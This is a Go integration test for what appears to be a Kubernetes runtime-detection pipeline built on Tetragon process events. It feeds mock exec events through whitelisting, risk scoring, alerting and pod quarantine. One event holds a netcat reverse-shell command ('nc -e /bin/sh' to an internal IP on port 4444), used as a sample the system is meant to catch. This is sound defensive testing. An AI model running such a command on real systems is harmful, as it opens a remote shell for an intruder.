package integration_test

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"github.com/executeid/ztre/pkg/collector"
	"github.com/executeid/ztre/pkg/containment"
	"github.com/executeid/ztre/pkg/decision"
	"github.com/executeid/ztre/pkg/discovery"
	"github.com/executeid/ztre/pkg/observability"
	"github.com/executeid/ztre/pkg/risk"
	"github.com/executeid/ztre/pkg/validator"
	"github.com/executeid/ztre/tests/testutil"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes/fake"
)

func TestEndToEndPipeline_Stage1To4(t *testing.T) {
	tempDir := t.TempDir()
	sockPath := filepath.Join(tempDir, "tetragon.sock")

	// 1. Stage 1/2: Start real Unix domain socket Tetragon gRPC Server
	lis, err := net.Listen("unix", sockPath)
	if err != nil {
		t.Fatalf("failed to listen on unix socket: %v", err)
	}
	defer lis.Close()

	grpcServer := grpc.NewServer()
	mockServer := testutil.NewMockTetragonServer()
	tetragon.RegisterFineGuidanceSensorsServer(grpcServer, mockServer)

	go func() {
		_ = grpcServer.Serve(lis)
	}()
	defer grpcServer.Stop()

	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	// Prepare mock events
	// Event 1: Legitimate nginx worker fork (Stage 2.5 pattern + Stage 3 NORMAL)
	ev1 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/usr/sbin/nginx", "frontend", "web", "worker-1")
	// Event 2: Legitimate shell inside container (Stage 3 NORMAL via manual override)
	ev2 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/bin/sh", "frontend", "web", "worker-1")
	// Event 3: Unknown binary running curl (Stage 3 SUSPICIOUS, YELLOW zone)
	ev3 := testutil.NewTetragonExecResponseWithArgs("/usr/local/bin/custom-app", "/usr/bin/curl", "http://internal.service", "frontend", "web", "worker-1")
	// Event 4: RCE / Bash spawn from nginx in database namespace (Stage 3 ANOMALOUS, RED zone)
	ev4 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/bin/bash", "database", "pg-db", "worker-1")
	// Event 5: Reverse shell Netcat invocation (Stage 3 ANOMALOUS, RED zone, Max 100)
	ev5 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/bin/nc", "-e /bin/sh 10.91.128.10 4444", "database", "pg-db", "worker-1")
	// Event 6: Non-execve event (exit event, should be tracked but not classified)
	ev6 := testutil.NewTetragonExitResponse("/usr/bin/whoami", "frontend", "web", "worker-1")

	mockServer.SetResponses([]*tetragon.GetEventsResponse{ev1, ev2, ev3, ev4, ev5, ev6})

	// 2. Stage 2: Initialize EventBuffer and Client
	eventBuffer := collector.NewEventBuffer(1000, logger)
	clientConfig := collector.ClientConfig{
		SocketPath:          sockPath,
		ReconnectInterval:   100 * time.Millisecond,
		MaxReconnectBackoff: 500 * time.Millisecond,
	}
	client := collector.NewClient(clientConfig, eventBuffer, logger)

	clientCtx, clientCancel := context.WithCancel(context.Background())
	defer clientCancel()

	clientErrCh := make(chan error, 1)
	go func() {
		clientErrCh <- client.Start(clientCtx)
	}()

	// 3. Stage 2.5: Initialize Behavioral Discovery Engine
	discoveryDir := filepath.Join(tempDir, "discovery")
	if err := os.MkdirAll(discoveryDir, 0o755); err != nil {
		t.Fatalf("failed to create discovery dir: %v", err)
	}

	tracker := discovery.NewBehaviorTracker(logger)
	baselineStore := discovery.NewBaselineStore(
		tracker,
		discoveryDir,
		1*time.Hour,
		4*time.Hour,
		logger,
	)
	reporter := discovery.NewBaselineReporter(tracker, baselineStore, logger)

	// 4. Stage 3: Setup Whitelist and Risk Engine Policies
	manualWhitelistPath := filepath.Join(tempDir, "manual_whitelist.yaml")
	manualWlContent := `
whitelisted_lineages:
  - parent: nginx
    allowed_children:
      - nginx
      - sh
`
	if err := os.WriteFile(manualWhitelistPath, []byte(manualWlContent), 0o644); err != nil {
		t.Fatalf("failed to write manual whitelist: %v", err)
	}

	autoWhitelistPath := filepath.Join(discoveryDir, "auto_whitelist.yaml")
	if err := os.WriteFile(autoWhitelistPath, []byte("whitelisted_lineages: []"), 0o644); err != nil {
		t.Fatalf("failed to write auto whitelist: %v", err)
	}

	whitelist, err := validator.NewWhitelist(autoWhitelistPath, logger)
	if err != nil {
		t.Fatalf("failed to create whitelist: %v", err)
	}
	if err := whitelist.LoadMulti(manualWhitelistPath); err != nil {
		t.Fatalf("failed to load manual whitelist: %v", err)
	}

	riskPolicyPath := filepath.Join(tempDir, "risk_policy.yaml")
	riskPolicyContent := `
weights:
  severity: 0.50
  context: 0.30
  asset_criticality: 0.20

severity_scores:
  reverse_shell: 100
  chmod_suid: 90
  curl_download: 80
  bash_spawn: 70
  file_write_etc: 60
  default: 20

context_scores:
  NORMAL: 0
  SUSPICIOUS: 50
  ANOMALOUS: 100

asset_criticality:
  critical:
    namespaces: [database]
    score: 100
  high:
    namespaces: [api]
    score: 75
  medium:
    namespaces: [backend]
    score: 50
  low:
    namespaces: [frontend]
    score: 25
  default_score: 50
`
	if err := os.WriteFile(riskPolicyPath, []byte(riskPolicyContent), 0o644); err != nil {
		t.Fatalf("failed to write risk policy: %v", err)
	}

	riskEngine, err := risk.NewEngine(riskPolicyPath, logger)
	if err != nil {
		t.Fatalf("failed to create risk engine: %v", err)
	}

	// 5. Stage 4: Initialize Decision Engine, Alert Dispatcher & Containment Executor
	decisionEngine := decision.NewEngine(decision.DefaultThresholds(), logger)

	// In-memory mock alert sink
	dispatchedAlerts := make([]decision.Alert, 0)
	alertSink := &mockSink{onSend: func(al decision.Alert) {
		dispatchedAlerts = append(dispatchedAlerts, al)
	}}
	alertDispatcher := decision.NewDispatcher(logger, alertSink)

	// Mock Kubernetes Client with the target pods
	frontendPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "web-pod-xyz",
			Namespace: "frontend",
			Labels:    map[string]string{"app": "frontend"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	databasePod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "pg-db-pod-xyz",
			Namespace: "database",
			Labels:    map[string]string{"app": "database"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	fakeK8s := fake.NewSimpleClientset(frontendPod, databasePod)
	containmentExecutor := containment.NewExecutor(fakeK8s, logger)

	// 6. Ingest & Process Events end-to-end
	type ProcessResult struct {
		Event          *collector.SecurityEvent
		Classification validator.Classification
		RiskScore      *risk.RiskScore
		Action         decision.Action
	}

	results := make([]ProcessResult, 0)
	timeout := time.After(3 * time.Second)

	// Collect 6 events from buffer
	for len(results) < 6 {
		select {
		case ev := <-eventBuffer.Events():
			// Track in discovery
			tracker.Track(ev)
			observability.DiscoveryEventsTotal.Inc()

			if ev.EventType != collector.EventTypeExecve {
				results = append(results, ProcessResult{
					Event: ev,
				})
				continue
			}

			// Validate lineage
			class := whitelist.Classify(ev.ParentBinary, ev.Binary)
			observability.EventsClassifiedTotal.WithLabelValues(string(class)).Inc()

			res := ProcessResult{
				Event:          ev,
				Classification: class,
			}

			if class != validator.ClassNormal {
				score := riskEngine.Calculate(ev, class)
				observability.RiskScoreHistogram.Observe(score.TotalScore)
				action := decisionEngine.EvaluateRiskScore(score)

				alert := decision.NewAlert(
					fmt.Sprintf("%s-%d", ev.PodName, ev.PID),
					ev.Namespace,
					ev.PodName,
					ev.ParentBinary,
					ev.Binary,
					ev.Arguments,
					class,
					score,
					action,
				)

				// Stage 4 Action routing
				switch action {
				case decision.ActionLogAndAlert:
					alertDispatcher.Dispatch(context.Background(), alert)
				case decision.ActionAutoContainment:
					alertDispatcher.Dispatch(context.Background(), alert)
					if err := containmentExecutor.Quarantine(context.Background(), ev.Namespace, ev.PodName, score.TotalScore); err != nil {
						t.Errorf("quarantine failed for %s/%s: %v", ev.Namespace, ev.PodName, err)
					}
				}

				res.RiskScore = &score
				res.Action = action
			}
			results = append(results, res)

		case <-timeout:
			t.Fatalf("timed out waiting for events, received %d of 6", len(results))
		}
	}

	// 7. Verify Results from all stages (1, 2, 2.5, 3, 4)

	// Event 1: nginx -> nginx (NORMAL -> ALLOW_AND_LOG)
	if results[0].Classification != validator.ClassNormal {
		t.Errorf("ev1: expected ClassNormal, got %s", results[0].Classification)
	}

	// Event 2: nginx -> sh (NORMAL via manual whitelist -> ALLOW_AND_LOG)
	if results[1].Classification != validator.ClassNormal {
		t.Errorf("ev2: expected ClassNormal, got %s", results[1].Classification)
	}

	// Event 3: custom-app -> curl in frontend (SUSPICIOUS -> Score 60 -> LOG_AND_ALERT)
	if results[2].Classification != validator.ClassSuspicious {
		t.Errorf("ev3: expected ClassSuspicious, got %s", results[2].Classification)
	}
	if results[2].Action != decision.ActionLogAndAlert {
		t.Errorf("ev3: expected LOG_AND_ALERT, got %s", results[2].Action)
	}
	if results[2].RiskScore.TotalScore != 60 {
		t.Errorf("ev3: expected risk score 60, got %.1f", results[2].RiskScore.TotalScore)
	}

	// Event 4: nginx -> bash in database (ANOMALOUS -> Score 85 -> AUTO_CONTAINMENT)
	if results[3].Classification != validator.ClassAnomalous {
		t.Errorf("ev4: expected ClassAnomalous, got %s", results[3].Classification)
	}
	if results[3].Action != decision.ActionAutoContainment {
		t.Errorf("ev4: expected AUTO_CONTAINMENT, got %s", results[3].Action)
	}

	// Event 5: Reverse Shell Netcat in database (ANOMALOUS -> Score 100 -> AUTO_CONTAINMENT)
	if results[4].Classification != validator.ClassAnomalous {
		t.Errorf("ev5: expected ClassAnomalous, got %s", results[4].Classification)
	}
	if results[4].Action != decision.ActionAutoContainment {
		t.Errorf("ev5: expected AUTO_CONTAINMENT, got %s", results[4].Action)
	}

	// 8. Verify Stage 4 Automated Containment on Kubernetes Pods
	// The database pod (pg-db-pod-xyz) MUST have ztre/quarantine: "true"
	updatedDbPod, err := fakeK8s.CoreV1().Pods("database").Get(context.Background(), "pg-db-pod-xyz", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("failed to get database pod: %v", err)
	}
	if val, ok := updatedDbPod.Labels[containment.QuarantineLabelKey]; !ok || val != containment.QuarantineLabelValue {
		t.Errorf("expected pod pg-db-pod-xyz to have label %s=%s, got %s (exists=%v)",
			containment.QuarantineLabelKey, containment.QuarantineLabelValue, val, ok)
	}

	// The frontend pod (web-pod-xyz) MUST NOT have quarantine label (only curl alert, no containment)
	updatedFrontendPod, err := fakeK8s.CoreV1().Pods("frontend").Get(context.Background(), "web-pod-xyz", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("failed to get frontend pod: %v", err)
	}
	if _, ok := updatedFrontendPod.Labels[containment.QuarantineLabelKey]; ok {
		t.Errorf("frontend pod web-pod-xyz should NOT have quarantine label!")
	}

	// 9. Verify Stage 4 Alert Dispatcher
	// We expect 3 dispatched alerts: ev3 (YELLOW alert), ev4 (RED alert), ev5 (RED alert)
	if len(dispatchedAlerts) != 3 {
		t.Errorf("expected 3 dispatched alerts, got %d", len(dispatchedAlerts))
	}

	// 10. Verify Discovery State & Persistence
	if tracker.TotalEvents() != 6 {
		t.Errorf("expected 6 total events tracked, got %d", tracker.TotalEvents())
	}
	if tracker.UniquePatternCount() != 5 {
		t.Errorf("expected 5 unique execve patterns, got %d", tracker.UniquePatternCount())
	}

	// Save snapshot to disk
	if err := baselineStore.SaveSnapshot(); err != nil {
		t.Fatalf("failed to save baseline snapshot: %v", err)
	}

	if err := reporter.WriteReport(discoveryDir); err != nil {
		t.Fatalf("failed to write baseline report: %v", err)
	}

	// 11. Test Clean Client Shutdown
	clientCancel()
	eventBuffer.Close()

	select {
	case err := <-clientErrCh:
		if err != nil {
			t.Errorf("client stopped with unexpected error: %v", err)
		}
	case <-time.After(1 * time.Second):
		t.Errorf("client did not stop cleanly on context cancel")
	}

	fmt.Println(">> Integrated End-to-End Pipeline (Stages 1, 2, 2.5, 3, 4): 100% PASSED")
}

type mockSink struct {
	onSend func(decision.Alert)
}

func (m *mockSink) Name() string { return "mock" }
func (m *mockSink) Send(_ context.Context, alert decision.Alert) error {
	if m.onSend != nil {
		m.onSend(alert)
	}
	return nil
}
